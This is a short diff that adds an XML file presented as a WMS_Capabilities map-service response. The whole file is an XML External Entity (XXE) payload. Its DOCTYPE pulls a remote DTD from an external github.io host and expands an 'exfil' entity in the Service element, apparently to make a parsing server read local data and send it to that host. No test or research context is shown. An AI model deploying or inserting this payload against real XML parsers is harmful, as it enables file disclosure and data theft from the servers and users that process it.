@@ -1,0 +1,8 @@
+<?xml version="1.0"?>
+<!DOCTYPE WMS_Capabilities [
+  <!ENTITY % remote SYSTEM "https://rhyru9.github.io/xxe/test.dtd">
+  %remote;
+]>
+<WMS_Capabilities>
+  <Service>&exfil;</Service>
+</WMS_Capabilities>
